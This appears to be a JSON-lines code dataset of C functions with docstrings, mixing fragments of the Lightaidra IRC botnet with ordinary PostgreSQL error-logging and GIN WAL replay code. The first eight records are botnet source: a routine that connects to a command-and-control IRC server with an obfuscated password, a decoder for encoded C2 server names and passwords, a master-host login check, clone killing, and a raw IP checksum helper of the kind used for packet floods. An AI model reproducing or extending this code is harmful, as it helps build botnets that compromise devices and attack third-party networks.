{"docstring": "/* connect_to_irc(sock_t *) */\n/* make an irc connection.  */\n", "func_signal": "int connect_to_irc(sock_t *sp)", "code": "{\n    int ps = 0, port = 0;\n    requests_t *req;\n    char *token, srv[32];\n\n    memset(srv, 0, sizeof srv);\n    token = strtok(isrv[counter], \":\");\n    while (token != NULL) {\n        if (!ps) {\n            strncpy(srv, token, sizeof(srv)-1);\n            ps++;\n        }\n        else {\n            port = atoi(token);\n        }\n\n        token = strtok(NULL, \":\");\n    }\n\n    sp->sockfd = false;\n    if (!(sp->sockhs = gethostbyname(srv))) return EXIT_FAILURE;\n    sp->sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\n    sp->sockadr.sin_family = AF_INET;\n    sp->sockadr.sin_port = htons(port);\n    sp->sockadr.sin_addr = *((struct in_addr *)sp->sockhs->h_addr);\n\n    memset(sp->sockadr.sin_zero, '\\0', sizeof sp->sockadr.sin_zero);\n\n    if (connect(sp->sockfd, (struct sockaddr *)&sp->sockadr, sizeof sp->sockadr) == false)\n        return EXIT_FAILURE;\n\n    getrstr();\n    snprintf(channel, sizeof(channel)-1, \"%s\", irc_chan);\n    snprintf(nt, 3, \"->%s\", nctype);\n\n    /* IRCD PASSWORD FOR MODDED SERVER/CLIENT WITH REPLACED PASS/local */\n    if (encirc != 0) {\n        decode(enc_passwd, 1);\n        if (sockwrite(sp->sockfd, \"%s %s\\n\", passproto, decodedpsw)) \n            return EXIT_FAILURE;\n    } \n    else {\n        if (sockwrite(sp->sockfd, \"%s %s\\n\", passproto, irc_passwd)) \n            return EXIT_FAILURE;\n    }\n\n    if (sockwrite(sp->sockfd, \"NICK %s\\n\", data_ptr))\n        return EXIT_FAILURE;\n    \n    if (sockwrite(sp->sockfd, \"USER pwn localhost localhost :Lightaidra ;)\\n\"))\n        return EXIT_FAILURE;\n\n    req = (requests_t *) malloc(sizeof(requests_t));\n\n    if (irc_requests(sp, req)) {\n        free(req);\n        return EXIT_FAILURE;\n    }\n\n    return EXIT_SUCCESS;\n}", "path": "source\\irc.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* cmd_status(sock_t * sp) */\n/* show the current status */\n", "func_signal": "void cmd_status(sock_t *sp)", "code": "{\n    if (!max_pids) sockwrite(sp->sockfd, \"PRIVMSG %s :[status] currently not working.\\n\", channel);\n    else sockwrite(sp->sockfd, \"PRIVMSG %s :[status] working on %s\\n\", channel, status_temp);\n    \n    return;\n}", "path": "source\\requests.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* decode()                         */\n/* a function to decode irc servers */\n/* encoded by ircencode.c tool      */\n", "func_signal": "void decode(char *str, int dtype)", "code": "{\n    char decoded[512];\n    int x = 0, i = 0, c;\n\n    char encodes[] = { \n        '<', '>', '@', '_', ';', ':', ',', '.', '-', '+', '*', '^', '?', '=', ')', '(', \n        '|', 'A', 'B', '&', '%', '$', 'D', '\"', '!', 'w', 'k', 'y', 'x', 'z', 'v', 'u', \n        't', 's', 'r', 'q', 'p', 'o', 'n', 'm', 'l', 'i', 'h', 'g', 'f', 'e', 'd', 'c', \n        'b', 'a', '~', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'F', 'U', 'C', 'K'\n    };\n\n    char decodes[] = { \n        '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', \n        'g', 'h', 'i', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'z', 'y', \n        'w', 'k', 'x', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'L', 'M', 'N', 'O', \n        'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'Z', 'Y', 'W', 'K', 'X', '|', ':', '.', '*'\n    };\n\n    memset(decoded, 0, sizeof(decoded));\n    \n    while (x < strlen(str)) {\n        for (c = 0; c <= sizeof(encodes); c++) {\n            if (str[x] == encodes[c]) {\n                if (!dtype) decodedsrv[i] = decodes[c];\n                else decodedpsw[i] = decodes[c];\n            \n                i++;\n            }\n        }\n\n        x++;\n    }\n\n    return;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* wordcmp(const char *, requests_t *) */\n/* a menu strncmp function.            */\n", "func_signal": "int wordcmpp(const char *s, requests_t *req)", "code": "{\n    if (strlen(req->rcv_sa) == strlen(s)+1) {\n        if (strcmp(req->rcv_sa, s)) return EXIT_SUCCESS;\n    }\n\n    return EXIT_FAILURE;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* pidprocess()     */\n/* check for clones */\n", "func_signal": "void pidprocess()", "code": "{\n    FILE *pidfd;\n    unsigned int pidc;\n\n    if (!access(pidfile, F_OK) && !access(pidfile, R_OK)) {\n        if ((pidfd = fopen(pidfile, \"r+\")) != NULL) {\n            fscanf(pidfd, \"%d\", &pidc);\n            fclose(pidfd);\n            kill(pidc, SIGKILL);\n            remove(pidfile);\n        }\n    }\n\n    if ((pidfd = fopen(pidfile, \"a+\")) != NULL) {\n        fprintf(pidfd, \"%d\", getpid());\n        fclose(pidfd);\n    }\n\n    return;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* in_cksum(unsigned short *, int)       */\n/* create a checksum for ipheader.       */\n/* i've found that function with google. */\n", "func_signal": "unsigned short in_cksum(unsigned short *ptr, int nbytes)", "code": "{\n    register long sum;\n    u_short oddbyte;\n    register u_short answer;\n\n    sum = 0;\n\n    while (nbytes > 1) {\n        sum += *ptr++;\n        nbytes -= 2;\n    }\n\n    if (nbytes == 1) {\n        oddbyte = 0;\n        *((u_char *) & oddbyte) = *(u_char *) ptr;\n        sum += oddbyte;\n    }\n\n    sum = (sum >> 16) + (sum & 0xffff);\n    sum += (sum >> 16);\n    answer = ~sum;\n    \n    return answer;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* parse_input_errors(sock_t *, requests_t *) */\n/* check for input errors.                    */\n", "func_signal": "int parse_input_errors(sock_t *sp, requests_t *req, \nunsigned short argn, unsigned short et)", "code": "{\n    int x = 0, y = 0;\n    char error_tags[3][32] = {\n        { 'a', 'b', 'c', 'd', 'e', 'f',\n        'g', 'h', 'i', 'l', 'm', 'n',\n        'o', 'p', 'q', 'r', 's', 't',\n        'u', 'v', 'z', 'y', 'w', 'k', \n        'x', 'j', '!', '?', ',',  0 },\n        { '.', ',', '?', '!', 0 }\n    };\n\n    while (error_tags[et][x] != 0) {\n        if (strchr(req->rcv_sb, error_tags[et][x])) y++;\n        if (argn == 2 || argn == 3 || argn == 4) {\n            if (strchr(req->rcv_sc, error_tags[et][x])) y++;\n        }\n        \n        if (argn == 3 || argn == 4) {\n            if (strchr(req->rcv_sd, error_tags[et][x])) y++;\n        }\n        \n        if (argn == 4) {\n            if (strchr(req->rcv_se, error_tags[et][x])) y++;\n        }\n\n        if (y > 0) {\n            sockwrite(sp->sockfd, \"PRIVMSG %s :[error] one error in your input data, see help!\\n\", channel);\n            return EXIT_FAILURE;\n        }\n\n        x++;\n    }\n\n    return EXIT_SUCCESS;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/* login_control(requests_t *)   */\n/* check if user is logged in.   */\n", "func_signal": "int login_control(requests_t *req)", "code": "{\n    if (strstr(req->rcv_a, master_host)) return EXIT_SUCCESS;\n    \n    return EXIT_FAILURE;\n}", "path": "source\\utils.c", "repo_name": "ociredefz/lightaidra", "stars": 93, "license": "None", "language": "c", "size": 40}
{"docstring": "/*\n * setup formatted_start_time\n */\n", "func_signal": "static void\nsetup_formatted_start_time(void)", "code": "{\n\tpg_time_t\tstamp_time = (pg_time_t) MyStartTime;\n\n\t/*\n\t * Note: we expect that guc.c will ensure that log_timezone is set up (at\n\t * least with a minimal GMT value) before Log_line_prefix can become\n\t * nonempty or CSV mode can be selected.\n\t */\n\tpg_strftime(formatted_start_time, FORMATTED_TS_LEN,\n\t\t\t\t\"%Y-%m-%d %H:%M:%S %Z\",\n\t\t\t\tpg_localtime(&stamp_time, log_timezone));\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * expand_fmt_string --- process special format codes in a format string\n *\n * We must replace %m with the appropriate strerror string, since vsnprintf\n * won't know what to do with it.\n *\n * The result is a palloc'd string.\n */\n", "func_signal": "static char *\nexpand_fmt_string(const char *fmt, ErrorData *edata)", "code": "{\n\tStringInfoData buf;\n\tconst char *cp;\n\n\tinitStringInfo(&buf);\n\n\tfor (cp = fmt; *cp; cp++)\n\t{\n\t\tif (cp[0] == '%' && cp[1] != '\\0')\n\t\t{\n\t\t\tcp++;\n\t\t\tif (*cp == 'm')\n\t\t\t{\n\t\t\t\t/*\n\t\t\t\t * Replace %m by system error string.  If there are any %'s in\n\t\t\t\t * the string, we'd better double them so that vsnprintf won't\n\t\t\t\t * misinterpret.\n\t\t\t\t */\n\t\t\t\tconst char *cp2;\n\n\t\t\t\tcp2 = useful_strerror(edata->saved_errno);\n\t\t\t\tfor (; *cp2; cp2++)\n\t\t\t\t{\n\t\t\t\t\tif (*cp2 == '%')\n\t\t\t\t\t\tappendStringInfoCharMacro(&buf, '%');\n\t\t\t\t\tappendStringInfoCharMacro(&buf, *cp2);\n\t\t\t\t}\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t/* copy % and next char --- this avoids trouble with %%m */\n\t\t\t\tappendStringInfoCharMacro(&buf, '%');\n\t\t\t\tappendStringInfoCharMacro(&buf, *cp);\n\t\t\t}\n\t\t}\n\t\telse\n\t\t\tappendStringInfoCharMacro(&buf, *cp);\n\t}\n\n\treturn buf.data;\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * FreeErrorData --- free the structure returned by CopyErrorData.\n *\n * Error handlers should use this in preference to assuming they know all\n * the separately-allocated fields.\n */\n", "func_signal": "void\nFreeErrorData(ErrorData *edata)", "code": "{\n\tif (edata->message)\n\t\tpfree(edata->message);\n\tif (edata->detail)\n\t\tpfree(edata->detail);\n\tif (edata->detail_log)\n\t\tpfree(edata->detail_log);\n\tif (edata->hint)\n\t\tpfree(edata->hint);\n\tif (edata->context)\n\t\tpfree(edata->context);\n\tif (edata->schema_name)\n\t\tpfree(edata->schema_name);\n\tif (edata->table_name)\n\t\tpfree(edata->table_name);\n\tif (edata->column_name)\n\t\tpfree(edata->column_name);\n\tif (edata->datatype_name)\n\t\tpfree(edata->datatype_name);\n\tif (edata->constraint_name)\n\t\tpfree(edata->constraint_name);\n\tif (edata->internalquery)\n\t\tpfree(edata->internalquery);\n\tpfree(edata);\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * CopyErrorData --- obtain a copy of the topmost error stack entry\n *\n * This is only for use in error handler code.  The data is copied into the\n * current memory context, so callers should always switch away from\n * ErrorContext first; otherwise it will be lost when FlushErrorState is done.\n */\n", "func_signal": "ErrorData *\nCopyErrorData(void)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\tErrorData  *newedata;\n\n\t/*\n\t * we don't increment recursion_depth because out-of-memory here does not\n\t * indicate a problem within the error subsystem.\n\t */\n\tCHECK_STACK_DEPTH();\n\n\tAssert(CurrentMemoryContext != ErrorContext);\n\n\t/* Copy the struct itself */\n\tnewedata = (ErrorData *) palloc(sizeof(ErrorData));\n\tmemcpy(newedata, edata, sizeof(ErrorData));\n\n\t/* Make copies of separately-allocated fields */\n\tif (newedata->message)\n\t\tnewedata->message = pstrdup(newedata->message);\n\tif (newedata->detail)\n\t\tnewedata->detail = pstrdup(newedata->detail);\n\tif (newedata->detail_log)\n\t\tnewedata->detail_log = pstrdup(newedata->detail_log);\n\tif (newedata->hint)\n\t\tnewedata->hint = pstrdup(newedata->hint);\n\tif (newedata->context)\n\t\tnewedata->context = pstrdup(newedata->context);\n\tif (newedata->schema_name)\n\t\tnewedata->schema_name = pstrdup(newedata->schema_name);\n\tif (newedata->table_name)\n\t\tnewedata->table_name = pstrdup(newedata->table_name);\n\tif (newedata->column_name)\n\t\tnewedata->column_name = pstrdup(newedata->column_name);\n\tif (newedata->datatype_name)\n\t\tnewedata->datatype_name = pstrdup(newedata->datatype_name);\n\tif (newedata->constraint_name)\n\t\tnewedata->constraint_name = pstrdup(newedata->constraint_name);\n\tif (newedata->internalquery)\n\t\tnewedata->internalquery = pstrdup(newedata->internalquery);\n\n\t/* Use the calling context for string allocation */\n\tnewedata->assoc_context = CurrentMemoryContext;\n\n\treturn newedata;\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errposition --- add cursor position to the current error\n */\n", "func_signal": "int\nerrposition(int cursorpos)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\n\t/* we don't bother incrementing recursion_depth */\n\tCHECK_STACK_DEPTH();\n\n\tedata->cursorpos = cursorpos;\n\n\treturn 0;\t\t\t\t\t/* return value does not matter */\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errhint --- add a hint error message text to the current error\n */\n", "func_signal": "int\nerrhint(const char *fmt,...)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\tMemoryContext oldcontext;\n\n\trecursion_depth++;\n\tCHECK_STACK_DEPTH();\n\toldcontext = MemoryContextSwitchTo(edata->assoc_context);\n\n\tEVALUATE_MESSAGE(edata->domain, hint, false, true);\n\n\tMemoryContextSwitchTo(oldcontext);\n\trecursion_depth--;\n\treturn 0;\t\t\t\t\t/* return value does not matter */\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * setup formatted_log_time, for consistent times between CSV and regular logs\n */\n", "func_signal": "static void\nsetup_formatted_log_time(void)", "code": "{\n\tstruct timeval tv;\n\tpg_time_t\tstamp_time;\n\tchar\t\tmsbuf[8];\n\n\tgettimeofday(&tv, NULL);\n\tstamp_time = (pg_time_t) tv.tv_sec;\n\n\t/*\n\t * Note: we expect that guc.c will ensure that log_timezone is set up (at\n\t * least with a minimal GMT value) before Log_line_prefix can become\n\t * nonempty or CSV mode can be selected.\n\t */\n\tpg_strftime(formatted_log_time, FORMATTED_TS_LEN,\n\t/* leave room for milliseconds... */\n\t\t\t\t\"%Y-%m-%d %H:%M:%S     %Z\",\n\t\t\t\tpg_localtime(&stamp_time, log_timezone));\n\n\t/* 'paste' milliseconds into place... */\n\tsprintf(msbuf, \".%03d\", (int) (tv.tv_usec / 1000));\n\tmemcpy(formatted_log_time + 19, msbuf, 4);\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * VACUUM_PAGE record contains simply a full image of the page, similar to\n * an XLOG_FPI record.\n */\n", "func_signal": "static void\nginRedoVacuumPage(XLogReaderState *record)", "code": "{\n\tBuffer\t\tbuffer;\n\n\tif (XLogReadBufferForRedo(record, 0, &buffer) != BLK_RESTORED)\n\t{\n\t\telog(ERROR, \"replay of gin entry tree page vacuum did not restore the page\");\n\t}\n\tUnlockReleaseBuffer(buffer);\n}", "path": "src\\backend\\access\\gin\\ginxlog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errfunction --- add reporting function name to the current error\n *\n * This is used when backwards compatibility demands that the function\n * name appear in messages sent to old-protocol clients.  Note that the\n * passed string is expected to be a non-freeable constant string.\n */\n", "func_signal": "int\nerrfunction(const char *funcname)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\n\t/* we don't bother incrementing recursion_depth */\n\tCHECK_STACK_DEPTH();\n\n\tedata->funcname = funcname;\n\tedata->show_funcname = true;\n\n\treturn 0;\t\t\t\t\t/* return value does not matter */\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * Initialization of error output file\n */\n", "func_signal": "void\nDebugFileOpen(void)", "code": "{\n\tint\t\t\tfd,\n\t\t\t\tistty;\n\n\tif (OutputFileName[0])\n\t{\n\t\t/*\n\t\t * A debug-output file name was given.\n\t\t *\n\t\t * Make sure we can write the file, and find out if it's a tty.\n\t\t */\n\t\tif ((fd = open(OutputFileName, O_CREAT | O_APPEND | O_WRONLY,\n\t\t\t\t\t   0666)) < 0)\n\t\t\tereport(FATAL,\n\t\t\t\t\t(errcode_for_file_access(),\n\t\t\t\t  errmsg(\"could not open file \\\"%s\\\": %m\", OutputFileName)));\n\t\tistty = isatty(fd);\n\t\tclose(fd);\n\n\t\t/*\n\t\t * Redirect our stderr to the debug output file.\n\t\t */\n\t\tif (!freopen(OutputFileName, \"a\", stderr))\n\t\t\tereport(FATAL,\n\t\t\t\t\t(errcode_for_file_access(),\n\t\t\t\t\t errmsg(\"could not reopen file \\\"%s\\\" as stderr: %m\",\n\t\t\t\t\t\t\tOutputFileName)));\n\n\t\t/*\n\t\t * If the file is a tty and we're running under the postmaster, try to\n\t\t * send stdout there as well (if it isn't a tty then stderr will block\n\t\t * out stdout, so we may as well let stdout go wherever it was going\n\t\t * before).\n\t\t */\n\t\tif (istty && IsUnderPostmaster)\n\t\t\tif (!freopen(OutputFileName, \"a\", stdout))\n\t\t\t\tereport(FATAL,\n\t\t\t\t\t\t(errcode_for_file_access(),\n\t\t\t\t\t\t errmsg(\"could not reopen file \\\"%s\\\" as stdout: %m\",\n\t\t\t\t\t\t\t\tOutputFileName)));\n\t}\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * set_errdata_field --- set an ErrorData string field\n */\n", "func_signal": "static void\nset_errdata_field(MemoryContextData *cxt, char **ptr, const char *str)", "code": "{\n\tAssert(*ptr == NULL);\n\t*ptr = MemoryContextStrdup(cxt, str);\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * geterrposition --- return the currently set error position (0 if none)\n *\n * This is only intended for use in error callback subroutines, since there\n * is no other place outside elog.c where the concept is meaningful.\n */\n", "func_signal": "int\ngeterrposition(void)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\n\t/* we don't bother incrementing recursion_depth */\n\tCHECK_STACK_DEPTH();\n\n\treturn edata->cursorpos;\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * elog_start --- startup for old-style API\n *\n * All that we do here is stash the hidden filename/lineno/funcname\n * arguments into a stack entry, along with the current value of errno.\n *\n * We need this to be separate from elog_finish because there's no other\n * C89-compliant way to deal with inserting extra arguments into the elog\n * call.  (When using C99's __VA_ARGS__, we could possibly merge this with\n * elog_finish, but there doesn't seem to be a good way to save errno before\n * evaluating the format arguments if we do that.)\n */\n", "func_signal": "void\nelog_start(const char *filename, int lineno, const char *funcname)", "code": "{\n\tErrorData  *edata;\n\n\t/* Make sure that memory context initialization has finished */\n\tif (ErrorContext == NULL)\n\t{\n\t\t/* Ooops, hard crash time; very little we can do safely here */\n\t\twrite_stderr(\"error occurred at %s:%d before error message processing is available\\n\",\n\t\t\t\t\t filename ? filename : \"(unknown file)\", lineno);\n\t\texit(2);\n\t}\n\n\tif (++errordata_stack_depth >= ERRORDATA_STACK_SIZE)\n\t{\n\t\t/*\n\t\t * Wups, stack not big enough.  We treat this as a PANIC condition\n\t\t * because it suggests an infinite loop of errors during error\n\t\t * recovery.  Note that the message is intentionally not localized,\n\t\t * else failure to convert it to client encoding could cause further\n\t\t * recursion.\n\t\t */\n\t\terrordata_stack_depth = -1;\t\t/* make room on stack */\n\t\tereport(PANIC, (errmsg_internal(\"ERRORDATA_STACK_SIZE exceeded\")));\n\t}\n\n\tedata = &errordata[errordata_stack_depth];\n\tif (filename)\n\t{\n\t\tconst char *slash;\n\n\t\t/* keep only base name, useful especially for vpath builds */\n\t\tslash = strrchr(filename, '/');\n\t\tif (slash)\n\t\t\tfilename = slash + 1;\n\t}\n\tedata->filename = filename;\n\tedata->lineno = lineno;\n\tedata->funcname = funcname;\n\t/* errno is saved now so that error parameter eval can't change it */\n\tedata->saved_errno = errno;\n\n\t/* Use ErrorContext for any allocations done at this level. */\n\tedata->assoc_context = ErrorContext;\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errdetail_internal --- add a detail error message text to the current error\n *\n * This is exactly like errdetail() except that strings passed to\n * errdetail_internal are not translated, and are customarily left out of the\n * internationalization message dictionary.  This should be used for detail\n * messages that seem not worth translating for one reason or another\n * (typically, that they don't seem to be useful to average users).\n */\n", "func_signal": "int\nerrdetail_internal(const char *fmt,...)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\tMemoryContext oldcontext;\n\n\trecursion_depth++;\n\tCHECK_STACK_DEPTH();\n\toldcontext = MemoryContextSwitchTo(edata->assoc_context);\n\n\tEVALUATE_MESSAGE(edata->domain, detail, false, false);\n\n\tMemoryContextSwitchTo(oldcontext);\n\trecursion_depth--;\n\treturn 0;\t\t\t\t\t/* return value does not matter */\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errdetail_plural --- add a detail error message text to the current error,\n * with support for pluralization of the message text\n */\n", "func_signal": "int\nerrdetail_plural(const char *fmt_singular, const char *fmt_plural,\n\t\t\t\t unsigned long n,...)", "code": "{\n\tErrorData  *edata = &errordata[errordata_stack_depth];\n\tMemoryContext oldcontext;\n\n\trecursion_depth++;\n\tCHECK_STACK_DEPTH();\n\toldcontext = MemoryContextSwitchTo(edata->assoc_context);\n\n\tEVALUATE_MESSAGE_PLURAL(edata->domain, detail, false);\n\n\tMemoryContextSwitchTo(oldcontext);\n\trecursion_depth--;\n\treturn 0;\t\t\t\t\t/* return value does not matter */\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
{"docstring": "/*\n * errstart --- begin an error-reporting cycle\n *\n * Create a stack entry and store the given parameters in it.  Subsequently,\n * errmsg() and perhaps other routines will be called to further populate\n * the stack entry.  Finally, errfinish() will be called to actually process\n * the error report.\n *\n * Returns TRUE in normal case.  Returns FALSE to short-circuit the error\n * report (if it's a warning or lower and not to be reported anywhere).\n */\n", "func_signal": "bool\nerrstart(int elevel, const char *filename, int lineno,\n\t\t const char *funcname, const char *domain)", "code": "{\n\tErrorData  *edata;\n\tbool\t\toutput_to_server;\n\tbool\t\toutput_to_client = false;\n\tint\t\t\ti;\n\n\t/*\n\t * Check some cases in which we want to promote an error into a more\n\t * severe error.  None of this logic applies for non-error messages.\n\t */\n\tif (elevel >= ERROR)\n\t{\n\t\t/*\n\t\t * If we are inside a critical section, all errors become PANIC\n\t\t * errors.  See miscadmin.h.\n\t\t */\n\t\tif (CritSectionCount > 0)\n\t\t\televel = PANIC;\n\n\t\t/*\n\t\t * Check reasons for treating ERROR as FATAL:\n\t\t *\n\t\t * 1. we have no handler to pass the error to (implies we are in the\n\t\t * postmaster or in backend startup).\n\t\t *\n\t\t * 2. ExitOnAnyError mode switch is set (initdb uses this).\n\t\t *\n\t\t * 3. the error occurred after proc_exit has begun to run.  (It's\n\t\t * proc_exit's responsibility to see that this doesn't turn into\n\t\t * infinite recursion!)\n\t\t */\n\t\tif (elevel == ERROR)\n\t\t{\n\t\t\tif (PG_exception_stack == NULL ||\n\t\t\t\tExitOnAnyError ||\n\t\t\t\tproc_exit_inprogress)\n\t\t\t\televel = FATAL;\n\t\t}\n\n\t\t/*\n\t\t * If the error level is ERROR or more, errfinish is not going to\n\t\t * return to caller; therefore, if there is any stacked error already\n\t\t * in progress it will be lost.  This is more or less okay, except we\n\t\t * do not want to have a FATAL or PANIC error downgraded because the\n\t\t * reporting process was interrupted by a lower-grade error.  So check\n\t\t * the stack and make sure we panic if panic is warranted.\n\t\t */\n\t\tfor (i = 0; i <= errordata_stack_depth; i++)\n\t\t\televel = Max(elevel, errordata[i].elevel);\n\t}\n\n\t/*\n\t * Now decide whether we need to process this report at all; if it's\n\t * warning or less and not enabled for logging, just return FALSE without\n\t * starting up any error logging machinery.\n\t */\n\n\t/* Determine whether message is enabled for server log output */\n\toutput_to_server = is_log_level_output(elevel, log_min_messages);\n\n\t/* Determine whether message is enabled for client output */\n\tif (whereToSendOutput == DestRemote && elevel != COMMERROR)\n\t{\n\t\t/*\n\t\t * client_min_messages is honored only after we complete the\n\t\t * authentication handshake.  This is required both for security\n\t\t * reasons and because many clients can't handle NOTICE messages\n\t\t * during authentication.\n\t\t */\n\t\tif (ClientAuthInProgress)\n\t\t\toutput_to_client = (elevel >= ERROR);\n\t\telse\n\t\t\toutput_to_client = (elevel >= client_min_messages ||\n\t\t\t\t\t\t\t\televel == INFO);\n\t}\n\n\t/* Skip processing effort if non-error message will not be output */\n\tif (elevel < ERROR && !output_to_server && !output_to_client)\n\t\treturn false;\n\n\t/*\n\t * We need to do some actual work.  Make sure that memory context\n\t * initialization has finished, else we can't do anything useful.\n\t */\n\tif (ErrorContext == NULL)\n\t{\n\t\t/* Ooops, hard crash time; very little we can do safely here */\n\t\twrite_stderr(\"error occurred at %s:%d before error message processing is available\\n\",\n\t\t\t\t\t filename ? filename : \"(unknown file)\", lineno);\n\t\texit(2);\n\t}\n\n\t/*\n\t * Okay, crank up a stack entry to store the info in.\n\t */\n\n\tif (recursion_depth++ > 0 && elevel >= ERROR)\n\t{\n\t\t/*\n\t\t * Ooops, error during error processing.  Clear ErrorContext as\n\t\t * discussed at top of file.  We will not return to the original\n\t\t * error's reporter or handler, so we don't need it.\n\t\t */\n\t\tMemoryContextReset(ErrorContext);\n\n\t\t/*\n\t\t * Infinite error recursion might be due to something broken in a\n\t\t * context traceback routine.  Abandon them too.  We also abandon\n\t\t * attempting to print the error statement (which, if long, could\n\t\t * itself be the source of the recursive failure).\n\t\t */\n\t\tif (in_error_recursion_trouble())\n\t\t{\n\t\t\terror_context_stack = NULL;\n\t\t\tdebug_query_string = NULL;\n\t\t}\n\t}\n\tif (++errordata_stack_depth >= ERRORDATA_STACK_SIZE)\n\t{\n\t\t/*\n\t\t * Wups, stack not big enough.  We treat this as a PANIC condition\n\t\t * because it suggests an infinite loop of errors during error\n\t\t * recovery.\n\t\t */\n\t\terrordata_stack_depth = -1;\t\t/* make room on stack */\n\t\tereport(PANIC, (errmsg_internal(\"ERRORDATA_STACK_SIZE exceeded\")));\n\t}\n\n\t/* Initialize data for this error frame */\n\tedata = &errordata[errordata_stack_depth];\n\tMemSet(edata, 0, sizeof(ErrorData));\n\tedata->elevel = elevel;\n\tedata->output_to_server = output_to_server;\n\tedata->output_to_client = output_to_client;\n\tif (filename)\n\t{\n\t\tconst char *slash;\n\n\t\t/* keep only base name, useful especially for vpath builds */\n\t\tslash = strrchr(filename, '/');\n\t\tif (slash)\n\t\t\tfilename = slash + 1;\n\t}\n\tedata->filename = filename;\n\tedata->lineno = lineno;\n\tedata->funcname = funcname;\n\t/* the default text domain is the backend's */\n\tedata->domain = domain ? domain : PG_TEXTDOMAIN(\"postgres\");\n\t/* initialize context_domain the same way (see set_errcontext_domain()) */\n\tedata->context_domain = edata->domain;\n\t/* Select default errcode based on elevel */\n\tif (elevel >= ERROR)\n\t\tedata->sqlerrcode = ERRCODE_INTERNAL_ERROR;\n\telse if (elevel == WARNING)\n\t\tedata->sqlerrcode = ERRCODE_WARNING;\n\telse\n\t\tedata->sqlerrcode = ERRCODE_SUCCESSFUL_COMPLETION;\n\t/* errno is saved here so that error parameter eval can't change it */\n\tedata->saved_errno = errno;\n\n\t/*\n\t * Any allocations for this error state level should go into ErrorContext\n\t */\n\tedata->assoc_context = ErrorContext;\n\n\trecursion_depth--;\n\treturn true;\n}", "path": "src\\backend\\utils\\error\\elog.c", "repo_name": "jarulraj/postgresql-cpp", "stars": 64, "license": "other", "language": "c", "size": 42050}
